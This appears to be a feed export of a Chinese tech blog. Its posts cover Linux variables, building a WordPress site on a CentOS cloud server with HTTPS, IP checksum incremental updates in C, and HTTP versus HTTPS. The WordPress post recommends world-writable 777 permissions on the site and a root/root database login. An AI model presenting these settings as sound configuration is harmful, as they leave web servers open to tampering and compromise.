title="2）系统中重要的10个环境变量"></a>2）系统中重要的10个环境变量</h5><table><thead><tr><th>变量名称</th><th>作用</th></tr></thead><tbody><tr><td>HOME</td><td>用户的主目录（即家目录）</td></tr><tr><td>SHELL</td><td>用户在使用的Shell解释器名称</td></tr><tr><td>HISTSIZE</td><td>输出的历史命令记录条数</td></tr><tr><td>HISTFILESIZE</td><td>保存的历史命令记录条数</td></tr><tr><td>MAIL</td><td>邮件保存路径</td></tr><tr><td>LANG</td><td>系统语言、语系名称</td></tr><tr><td>RANDOM</td><td>生成一个随机数字</td></tr><tr><td>PS1</td><td>Bash解释器的提示符</td></tr><tr><td>PATH</td><td>定义解释器搜索用户执行命令的路径</td></tr><tr><td>EDITOR</td><td>用户默认的文本编辑器</td></tr></tbody></table><h5 id="3）自定义变量"><a href="#3）自定义变量" class="headerlink" title="3）自定义变量"></a>3）自定义变量</h5><p>[root@localhost ~]# WORD=home</p><p>[root@localhost ~]# echo $WORD</p><p>home</p><p>这样定义的变量不具有全局性，可以提升为全局性</p><p>[root@localhost ~]# export WORD</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;一、重定向&quot;&gt;&lt;a href=&quot;#一、重定向&quot; class=&quot;headerlink&quot; title=&quot;一、重定向&quot;&gt;&lt;/a&gt;一、重定向&lt;/h4&gt;&lt;p&gt;重定向分为输入重定向和输出重定向,输出重定向又分为标椎重定向和错误重新向，输出重定向有分为两种写入格式，清空写入和追加写入&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://soliym.top/categories/Linux/"/>
    
    
      <category term="Rhcsa" scheme="http://soliym.top/tags/Rhcsa/"/>
    
  </entry>
  
  <entry>
    <title>云服务器搭建Web网站二</title>
    <link href="http://soliym.top/2019/12/26/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BAWeb%E7%BD%91%E7%AB%99%E4%BA%8C/"/>
    <id>http://soliym.top/2019/12/26/云服务器搭建Web网站二/</id>
    <published>2019-12-26T07:08:51.000Z</published>
    <updated>2019-12-26T07:15:35.727Z</updated>
    
    <content type="html"><![CDATA[<p>前面讲到我们访问网站是通过IP地址并且后面还需要加/wordpress,这样访问太过于繁琐，而且不是基于https网站，那么下面将通过注册域名来使网站的访问更加简单</p><a id="more"></a><h4 id="一、域名注册"><a href="#一、域名注册" class="headerlink" title="一、域名注册"></a><em>一、域名注册</em></h4><p>在阿里云注册域名，t根据自己需求购买域名，如果是学习测试可以使用便宜的域名，比如top，在阿里云购买以后，会有一段的审核时间</p><h4 id="二、域名解析"><a href="#二、域名解析" class="headerlink" title="二、域名解析"></a><em>二、域名解析</em></h4><p>DNS域名解析的具体过程就不在说了，下面介绍域名和IP的绑定</p><p>1、在阿里云的控制台中找到购买的域名，点击解析</p><p>2、在解析里面添加记录，会有5个选项</p><p>​     记录类型：在阿里云中关于各种类型会有介绍，主要是A、AAAA和CNAME,</p><p>​      主机记录：也就是主机名称，表示某个域下的某台主机，www就是表示一台web主机，常用的     www、@、mail，主机记录的后面的问号给出了它们的用处</p><p>   解析线路：默认就可以了</p><p>   记录值：不同的记录类型有不同的写法，比如A对应IPV4，CNAME对应域名，详细可以在阿里云右上如何   设 置解析查看，ip与域名绑定肯定需要ip的，这个就是域名服务器的公网ip</p><p>   TTL：也就是域名服务器的更新时间，为保证各域名是否正在运行，则需要定期更新，默认10分钟就可以</p><p>​      </p><p>我们需要添加两</p><p>条记录，一条是www还有一条@，表示我们可以通过<a href="http://www.xx.com和xx.com方式访问" target="_blank" rel="noopener">www.xx.com和xx.com方式访问</a></p><p><img src="/2019/12/26/云服务器搭建Web网站二/QQ截图20191224194624.png" alt="QQ截图20191224194624"></p><h4 id="三、云服务器设置"><a href="#三、云服务器设置" class="headerlink" title="三、云服务器设置"></a><em>三、云服务器设置</em></h4><p>域名解析正常后，通过域名访问到的是云服务器/var/www/html/index.html文件，如果要正常访问wrodpress就需要对服务器的配置文件进行设置</p><h5 id="1、通过IP地址直接访问wordpress"><a href="#1、通过IP地址直接访问wordpress" class="headerlink" title="1、通过IP地址直接访问wordpress"></a>1、通过IP地址直接访问wordpress</h5><p>复制wordpress中的index.php文件到网站根目录/var/www/html，下并修改文档最后一句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-3naulqbx html]# mv /var/www/html/wordpress/index.php /var/www/html</span><br><span class="line">[root@instance-3naulqbx html]# vim index.php</span><br><span class="line">require( dirname( __FILE__ ) . &apos;/wordpress/wp-blog-header.php&apos; );</span><br></pre></td></tr></table></figure><h5 id="2、通过https访问wordpress"><a href="#2、通过https访问wordpress" class="headerlink" title="2、通过https访问wordpress"></a>2、通过https访问wordpress</h5><p>将网站设置为https，https比http安全性更好，在http的基础上添加一个安全套层，在http连接建立前通过密钥协商，对传输内容加密</p><p>自定义ssl文件，访问网站时会有风险提示，如果要解除提示，需要申请证书，可在云服务器提供商处购买证书</p><h6 id="1）安装ssl"><a href="#1）安装ssl" class="headerlink" title="1）安装ssl"></a><em>1<strong>）安装</strong>ssl</em></h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-3naulqbx html]# yum install mod_ssl -y</span><br></pre></td></tr></table></figure><h6 id="2）新建加密文件"><a href="#2）新建加密文件" class="headerlink" title="2）新建加密文件"></a><em>2）新建加密文件</em></h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-3naulqbx html]# cd /etc/pki/tls/certs</span><br><span class="line">[root@instance-3naulqbx certs]# make wordpress.crt</span><br></pre></td></tr></table></figure><h6 id="3）修改配置文件"><a href="#3）修改配置文件" class="headerlink" title="3）修改配置文件"></a><em>3）修改配置文件</em></h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@instance-3naulqbx certs]# vim /etc/httpd/conf.d/vhosts.conf</span><br></pre></td></tr></table></figure><p>将下面的内容复制到vhosts.conf中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory /www&gt;</span><br><span class="line">        AllowOverride none</span><br><span class="line">        Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line">&lt;VirtualHost 106.12.193.196:80&gt;</span><br><span class="line">        DocumentRoot /www/html</span><br><span class="line">        ServerName 106.12.193.196</span><br><span class="line">        ErrorLog &quot;/var/log/httpd/dummy-host2.example.com-error_log&quot;</span><br><span class="line">        CustomLog &quot;/var/log/httpd/dummy-host2.example.com-access_log&quot; common</span><br><span class="line">        SSLEngine on</span><br><span class="line">        SSLProtocol all -SSLv2</span><br><span class="line">        SSLCipherSuite HIGH:MEDIUM:!aNULL:!MD5:!SEED:!IDEA</span><br><span class="line">        SSLCertificateFile /etc/pki/tls/certs/wordpress.crt</span><br><span class="line">        SSLCertificateKeyFile /etc/pki/tls/certs/wordpress.key</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure><h6 id="4）重启服务"><a href="#4）重启服务" class="headerlink" title="4）重启服务"></a><em>4）重启服务</em></h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-3naulqbx certs]# systemctl restart httpd</span><br></pre></td></tr></table></figure><p>因为ssl证书是自签名的所以网站访问会有风险提示，可以选择购买ssl证书</p><p>（1）购买DV（域名型）证书</p><p>（2）使用DNS验证</p><p> 在域名解析中添加一条记录，根据提示验证完成后，下载证书，证书会包含中平台的证书文件，将Apache文件夹下的三个文件通过xftp上传到服务器</p><p> var/www/ssl/ssl/</p><p>（3）修改https配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-3naulqbx ~]# vim /etc/httpd/conf.d/ssl.conf</span><br><span class="line">SSLCertificateFile /var/www/ssl/ssl/zhixingit.top_ssl.crt</span><br><span class="line">       SSLCertificateKeyFile /var/www/ssl/ssl/zhixingit.top_ssl.key</span><br><span class="line">       SSLCertificateChainFile /var/www/ssl/ssl/zhixingit.top_chain.crt</span><br></pre></td></tr></table></figure><p>将以上三行的属性修改为上传的证书文件的地址，注意后缀名要对应</p><p>（4）重启服务</p><p>重启服务后显示仍然会有风险提示，但是现在的提示为“证书对某IP无效，以及对某域名有效”，应为DV为域名型证书，只对域名有效，通过IP访问不能通过</p><h5 id="3、通过域名访问wordpress"><a href="#3、通过域名访问wordpress" class="headerlink" title="3、通过域名访问wordpress"></a>3、通过域名访问wordpress</h5><p>1）在域名解析正常后，仍不能正常访问网站，因为需要备案，只有备案通过后才能访问</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前面讲到我们访问网站是通过IP地址并且后面还需要加/wordpress,这样访问太过于繁琐，而且不是基于https网站，那么下面将通过注册域名来使网站的访问更加简单&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://soliym.top/categories/Linux/"/>
    
    
      <category term="Web服务器" scheme="http://soliym.top/tags/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>云服务器搭建web网站一</title>
    <link href="http://soliym.top/2019/12/24/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BAWeb%E7%BD%91%E7%AB%99%E4%B8%80/"/>
    <id>http://soliym.top/2019/12/24/云服务器搭建Web网站一/</id>
    <published>2019-12-24T08:19:08.000Z</published>
    <updated>2019-12-24T08:40:31.928Z</updated>
    
    <content type="html"><![CDATA[<p>本文是关于在云服务器上搭建web服务器的过程，云服务器是百度智能云上的学生套餐，安装的是Linux的centos，下面将从云服务器的购买到搭建wordpress网站，详细介绍每一步流程</p><a id="more"></a><h3 id="一、购买云服务器"><a href="#一、购买云服务器" class="headerlink" title="一、购买云服务器"></a>一、购买云服务器</h3><p>在百度云购买云服务器，学生8元/月，操作系统Linux，入门级服务器，在腾讯云中也有学生优惠套餐，10元/月，服务器在哪都可以，重点是操作系统，本文以centos7.2位例</p><h3 id="二、登录云服务器"><a href="#二、登录云服务器" class="headerlink" title="二、登录云服务器"></a>二、登录云服务器</h3><h5 id="1、在实例设置中重装操作系统，版本为centos7以上，通过密码登录"><a href="#1、在实例设置中重装操作系统，版本为centos7以上，通过密码登录" class="headerlink" title="1、在实例设置中重装操作系统，版本为centos7以上，通过密码登录"></a>1、在实例设置中重装操作系统，版本为centos7以上，通过密码登录</h5><h5 id="2、通过浏览器的VNC远程登录"><a href="#2、通过浏览器的VNC远程登录" class="headerlink" title="2、通过浏览器的VNC远程登录"></a>2、通过浏览器的VNC远程登录</h5><h5 id="3、通过Xshell登录"><a href="#3、通过Xshell登录" class="headerlink" title="3、通过Xshell登录"></a>3、通过Xshell登录</h5><p>1）通过公网IP地址登录</p><p>2）查看Linux版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-3naulqbx ~]# cat /etc/centos-release</span><br><span class="line">CentOS Linux release 7.2.1511 (Core)</span><br></pre></td></tr></table></figure><h3 id="三、云服务器配置"><a href="#三、云服务器配置" class="headerlink" title="三、云服务器配置"></a>三、云服务器配置</h3><h5 id="1、查看是否安装httpd-Apache-及软件包管理器yum"><a href="#1、查看是否安装httpd-Apache-及软件包管理器yum" class="headerlink" title="1、查看是否安装httpd(Apache)及软件包管理器yum"></a>1、查看是否安装httpd(Apache)及软件包管理器yum</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-3naulqbx /]# rpm -ql httpd    </span><br><span class="line">[root@instance-3naulqbx /]# rpm -ql yum</span><br></pre></td></tr></table></figure><h5 id="2、安装httpd，如果安装则跳过"><a href="#2、安装httpd，如果安装则跳过" class="headerlink" title="2、安装httpd，如果安装则跳过"></a>2、安装httpd，如果安装则跳过</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-3naulqbx /]# yum install httpd</span><br></pre></td></tr></table></figure><h5 id="3、重启httpd服务"><a href="#3、重启httpd服务" class="headerlink" title="3、重启httpd服务"></a>3、重启httpd服务</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-3naulqbx ~]# systemctl restart httpd</span><br></pre></td></tr></table></figure><h5 id="4、在浏览器中测试"><a href="#4、在浏览器中测试" class="headerlink" title="4、在浏览器中测试"></a>4、在浏览器中测试</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://你的公网IP地址</span><br></pre></td></tr></table></figure><p>如果显示Apache的欢迎界面，则配置成功，那么web服务的基础配置完成</p><h3 id="四、网站搭建"><a href="#四、网站搭建" class="headerlink" title="四、网站搭建"></a>四、网站搭建</h3><h4 id="1、静态网站"><a href="#1、静态网站" class="headerlink" title="1、静态网站"></a>1、静态网站</h4><p>/var/www/html目录下创建index.html文件，该文件是web网站访问的默认访问页面，如果有该文件，则客户端访问该页面，没有则访问Apache的欢迎界面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-3naulqbx ~]# vim /var/www/html/index.html</span><br></pre></td></tr></table></figure><p>在文件中写入helloworld</p><p>-—————————</p><p>关于vim的操作，可以去学习一下，在网站部署中会经常用到，一般操作，按I 编辑文件，按esc回到命令模式，然后Ctrl+：进入到末行模式，输入wq 保存退出</p><p>-—————————</p><p>静态网站就搭建完成，可以通过前端修改index.html</p><h4 id="2、wordpress网站搭建"><a href="#2、wordpress网站搭建" class="headerlink" title="2、wordpress网站搭建"></a>2、wordpress网站搭建</h4><p>LAMP=Linux+Apache+mariadb+php</p><p>以上表示Linux服务器搭建动态网站需要的四种工具</p><p>操作系统Linux、Web服务平台Apache、数据库mariadb（MySQL）、PHP脚本语言</p><p>因此，在服务器中必须包含四种工具，前面已经安装了前两个，接下来安装后两个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-3naulqbx ~]# yum install php* -y</span><br><span class="line">[root@instance-3naulqbx test]# yum install -y mariadb-server.x86_64</span><br></pre></td></tr></table></figure><p>安装完以后重启mariadb</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-3naulqbx test]# systemctl restart mariadb</span><br></pre></td></tr></table></figure><h5 id="（1）上传WordPress源码"><a href="#（1）上传WordPress源码" class="headerlink" title="（1）上传WordPress源码"></a>（1）上传WordPress源码</h5><p>1）在/下创建一个test目录，用来存放web程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-3naulqbx ~]# mkdir /test</span><br></pre></td></tr></table></figure><p>2）使用xshell上传源码到服务器</p><p>打开xftp，进入到xftp界面，左边为自己主机，右边为服务器，找到test目录，将web程序拖拽到服务器的方框内，上传完成后，在服务器中查看</p><h5 id="（2）配置MySQL数据库"><a href="#（2）配置MySQL数据库" class="headerlink" title="（2）配置MySQL数据库"></a>（2）配置MySQL数据库</h5><p>1）初始化数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-3naulqbx test]# mysql_secure_installation</span><br></pre></td></tr></table></figure><p>一直回车就可以</p><p>2）创建数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-3naulqbx test]# mysql -uroot -proot</span><br></pre></td></tr></table></figure><p>创建数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; create database wordpress;</span><br></pre></td></tr></table></figure><p>通过show查看是否创建成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; show databases;</span><br></pre></td></tr></table></figure><p>注意每条命令后的’;’，输入quit退出</p><p>然后重启数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-3naulqbx test]# systemctl restart mariadb.service</span><br></pre></td></tr></table></figure><h5 id="（3）解压web程序"><a href="#（3）解压web程序" class="headerlink" title="（3）解压web程序"></a>（3）解压web程序</h5><p>进入网站的默认文档目录下，删除index.html文件，然后将web程序移动到该目录下解压</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-3naulqbx test]# cd /var/www/html</span><br><span class="line">[root@instance-3naulqbx html]# mv /test/wordpress-4.7.4-zh_CN.zip  /var/www/html</span><br><span class="line">[root@instance-3naulqbx html]# unzip wordpress-4.7.4-zh_CN.zip</span><br></pre></td></tr></table></figure><h5 id="（4）测试"><a href="#（4）测试" class="headerlink" title="（4）测试"></a>（4）测试</h5><p>在网站中输入公网IP/wordpress,如果出现WordPress的安装界面，则安装成功</p><p>可能出现的问题：</p><p>1）如果不出现安装界面，但是出现“Index of /wordpress”界面，可能是PhP或者mysql没有安装成功，检查重装。</p><p>2）出现“您的PHP似乎没有安装运行WordPress所必需的MySQL扩展”提示，可用通过安装php-mysql解决</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-3naulqbx wordpress]# yum install php-mysql</span><br></pre></td></tr></table></figure><p>（5）安装wordpress</p><p>1）数据库名为服务器创建的数据库名</p><p>2）用户名和密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-3naulqbx test]# mysql -uroot -proot</span><br></pre></td></tr></table></figure><p>-u后为用户名</p><p>-p后为 密码</p><p>3）其他默认</p><p>4）配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-3naulqbx wordpress]# vim wp-config.php</span><br></pre></td></tr></table></figure><p>根据提示建立wp-config.php文件</p><h5 id="（6）安装完成"><a href="#（6）安装完成" class="headerlink" title="（6）安装完成"></a>（6）安装完成</h5><p>如果成功进入到wrodpress界面，那么安装成功，但是在访问该界面时，还是通过IP访问，我们通常都是通过域名访问的，下一节将介绍通过域名访问并且是https访问</p><h5 id="（7）关于wrodpress"><a href="#（7）关于wrodpress" class="headerlink" title="（7）关于wrodpress"></a>（7）关于wrodpress</h5><p>wrodpress中有许多主题和插件，但是下载需要ftp服务，下面提供一个解决方法，可以不用ftp服务就可以在线更新</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-3naulqbx wordpress]# vim wp-config.php </span><br><span class="line">  define(&quot;FS_METHOD&quot;, &quot;direct&quot;);</span><br><span class="line">  define(&quot;FS_CHMOD_DIR&quot;, 0777);</span><br><span class="line">  define(&quot;FS_CHMOD_FILE&quot;, 0777);</span><br></pre></td></tr></table></figure><p>打开wp-cinfig.php文件，将这三行添加在最后并且修改wordpress的权限为777</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-3naulqbx html]# chmod 777 -R wordpress/</span><br></pre></td></tr></table></figure><p>由于wrodpress官方服务器的问题，现在会出现 “too many  Request”问题</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文是关于在云服务器上搭建web服务器的过程，云服务器是百度智能云上的学生套餐，安装的是Linux的centos，下面将从云服务器的购买到搭建wordpress网站，详细介绍每一步流程&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://soliym.top/categories/Linux/"/>
    
    
      <category term="Web服务器" scheme="http://soliym.top/tags/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>internet校验和的增量更新</title>
    <link href="http://soliym.top/2019/12/05/internet%E6%A0%A1%E9%AA%8C%E5%92%8C%E7%9A%84%E5%A2%9E%E9%87%8F%E6%9B%B4%E6%96%B0/"/>
    <id>http://soliym.top/2019/12/05/internet校验和的增量更新/</id>
    <published>2019-12-05T14:25:59.000Z</published>
    <updated>2019-12-05T14:57:22.113Z</updated>
    
    <content type="html"><![CDATA[<p>在IP协议中，首部格式中有一个首部校验和字段，该字段采用的校验方法与常用的奇偶校验和循环冗余校验不同，下面将详细介绍这种方法，以及它所遇到的问题及解决方案</p><a id="more"></a><h3 id="一、校验方法"><a href="#一、校验方法" class="headerlink" title="一、校验方法"></a>一、校验方法</h3><p>IP首部的校验方法：</p><p>只校验首部不校验数据部分</p><p>发送方：将校验和字段置为0，然后将首部以2字节为一组，以二进制反码的形式相加，将其结果取反码后，写入到IP数据报的首部校验和字段。</p><p>接受方：与发送方的操作相似，收到数据报后，将首部以2字节16bit为一组，以二进制反码的形式相加，如果结果为1，则表示该数据报的首部在传输中没有差错，否则出现差错。</p><p>该方法在TCP/IP协议中有很多协议都会用到，比如TCP、UDP，不同的是，TCP、UDP添加了12字节的伪首部</p><h3 id="二、存在的问题"><a href="#二、存在的问题" class="headerlink" title="二、存在的问题"></a>二、存在的问题</h3><p>在TCP、UDP存在的问题是这种检错的方法并不可靠，但是它简单、效率高，在TCP、UDP中并没有什么太大的缺陷，而在IP数据报中，因为IP数据报是基于第三层网络层转发的，因此，会频繁的对IP数据报修改，比如IP协议中的TTL值，每经过一个路由器都要减去1，该值都要发生变化，对应校验和也要发生变化，而源数据只发生了很小的一次变化，就要重新计算校验和，这大大降低了路由器的转发速率。</p><p>在RFC1141文档中提供了一种解决方法：增量更新</p><p>即在原始值只发生了很小的变化，可以对校验和做出很小的改变，而不用重新计算校验和</p><h3 id="三、解决方案"><a href="#三、解决方案" class="headerlink" title="三、解决方案"></a>三、解决方案</h3><p>原始校验和C，以及字节m的旧值和新值：</p><p>​         C’= C +（-m）+ m’= C +（m’-m）</p><p>虽然该公式更新了校验和C，但是没更新校验和的反码</p><p> 〜C’=〜（C +（-m）+ m’）=〜C +（m-m’）=〜C + m +〜m’</p><p>C语言代码实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*implemented according with RFC 1071 and1141*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="title">csum_incremental_update</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">short</span> old_csum,</span></span></span><br><span class="line"><span class="function"><span class="params">​                <span class="keyword">unsigned</span> <span class="keyword">short</span> old_field,</span></span></span><br><span class="line"><span class="function"><span class="params">​                <span class="keyword">unsigned</span> <span class="keyword">short</span> new_field)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">long</span> csum = old_csum + old_field + (~new_field &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">   csum = (csum &gt;&gt; <span class="number">16</span>) + (csum &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">   csum +=  (csum &gt;&gt; <span class="number">16</span>);</span><br><span class="line">   <span class="keyword">return</span> csum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在IP协议中，首部格式中有一个首部校验和字段，该字段采用的校验方法与常用的奇偶校验和循环冗余校验不同，下面将详细介绍这种方法，以及它所遇到的问题及解决方案&lt;/p&gt;
    
    </summary>
    
      <category term="网络" scheme="http://soliym.top/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
      <category term="网络层" scheme="http://soliym.top/tags/%E7%BD%91%E7%BB%9C%E5%B1%82/"/>
    
  </entry>
  
  <entry>
    <title>Http与Https的区别和加密原理</title>
    <link href="http://soliym.top/2019/12/02/Http%E4%B8%8EHttps%E7%9A%84%E5%8C%BA%E5%88%AB%E5%92%8C%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86/"/>
    <id>http://soliym.top/2019/12/02/Http与Https的区别和加密原理/</id>
    <published>2019-12-02T13:24:38.000Z</published>
    <updated>2019-12-02T13:30:35.557Z</updated>
    
    <content type="html"><![CDATA[<p>HTTP与HTTPS的区别及工作过程  </p><a id="more"></a>                                                          <h3 id="一、HTTP介绍"><a href="#一、HTTP介绍" class="headerlink" title="一、HTTP介绍"></a>一、HTTP介绍</h3><h4 id="1、什么是HTTP"><a href="#1、什么是HTTP" class="headerlink" title="1、什么是HTTP"></a>1、什么是HTTP</h4><p>（一）HTTP（Hypertext Transfer Protocol）：超文本传输协议</p><p>一种建立在TCP上的无状态连接的应用层协议，HTTP是WWW的数据交互的基础，超文本文档包括超链接链接到其他资源用户可以很容易获取。HTTP发展用来促进超文本和WWW。所谓协议，就是指双方遵循的规则、约定。http协议，就是浏览器和服务器之间进行通信的一种规规则。</p><p>（二）TCP-IP详解对HTTP的概述</p><p>H T T P是一个简单的协议。客户进程建立一条同服务器进程的 T C P连接，然后发出请求并读取服务器进程的响应。服务器进程关闭连接表示本次响应结束。服务器进程返回的文件通常含有指向其他服务器上文件的指针 (超文本链接)。用户显然可以很轻松地沿着这些链接从一 个服务器到下一个服务器。 </p><h4 id="2、HTTP特点"><a href="#2、HTTP特点" class="headerlink" title="2、HTTP特点"></a>2、HTTP特点</h4><p>1、简单：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。每种方法规定了客户与服务器联系的不同类型。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。</p><p>2、灵活：HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。</p><p>3、请求-响应模式：客户端每次向服务器发起一个请求时都建立一个连接， 服务器处理完客户的请求即断开连接。</p><p>4、无状态：HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。 </p><h4 id="3、HTTP工作过程"><a href="#3、HTTP工作过程" class="headerlink" title="3、HTTP工作过程"></a>3、HTTP工作过程</h4><h5 id="（一）概述"><a href="#（一）概述" class="headerlink" title="（一）概述"></a>（一）概述</h5><p>HTTP客户端发起请求，创建端口。</p><p>HTTP服务器在端口监听客户端请求。</p><p>HTTP服务器向客户端返回状态和内容</p><h5 id="（二）详解"><a href="#（二）详解" class="headerlink" title="（二）详解"></a>（二）详解</h5><h6 id="1、输入地址后回车，首先执行域名解析"><a href="#1、输入地址后回车，首先执行域名解析" class="headerlink" title="1、输入地址后回车，首先执行域名解析"></a>1、输入地址后回车，首先执行域名解析</h6><p>（1）查询浏览器自身的DNS缓冲</p><p>（2）如果缓冲失效则查找系统的DNS缓冲</p><p>（3）如果系统DNS缓冲没有查到则查看本地Host文件</p><p>（4）如果找不到配置则浏览器发起DNS系统调用</p><p>（5）主机向DNS服务器发起查询，获取IP地址</p><h6 id="2、连接并进行通信"><a href="#2、连接并进行通信" class="headerlink" title="2、连接并进行通信"></a>2、连接并进行通信</h6><p>（1）浏览器获得域名对应的IP地址后，发起TCP“三次握手”</p><p>（2）TCP/IP连接建立起来后，浏览器就可以向服务器发送http请求</p><p>（3）服务器接收到这个请求，根据路径参数，经过后端的一些处理之后，把处理后的一个结果的数据返回给浏览器</p><h6 id="3、浏览器渲染页面"><a href="#3、浏览器渲染页面" class="headerlink" title="3、浏览器渲染页面"></a>3、浏览器渲染页面</h6><h6 id="4、HTTP的不足"><a href="#4、HTTP的不足" class="headerlink" title="4、HTTP的不足"></a>4、HTTP的不足</h6><p>（一）安全性</p><p>​      （1）HTTP使用明文通信，内容可能窃取</p><p>​      （2）不验证通信方的身份，因此有可能遭遇伪装</p><p>​      （3）无法证明报文的完整性，有可能已遭篡改</p><p>（二）响应时间长</p><p>​      （1）基于TCP工作，可靠但是速度慢</p><p>​      （2）HTTP协议是无状态协议，传输完成后断开TCP连接，下一次的请求需要重新建立连接</p><p>（三）臃肿的消息首部</p><h3 id="二、HTTP的改进-HTTPS"><a href="#二、HTTP的改进-HTTPS" class="headerlink" title="二、HTTP的改进-HTTPS"></a>二、HTTP的改进-HTTPS</h3><p>Https并不是一个崭新的协议，而是在http的基础上发展而来相当于是Http的升级版。它主要是为了解决http协议安全性不足的问题而诞生的。HTTPS 就是在 HTTP 下加入了 SSL 层，从而保护了交换数据隐私和完整性，提供对网站服务器身份认证的功能，简单来说它就是安全版的 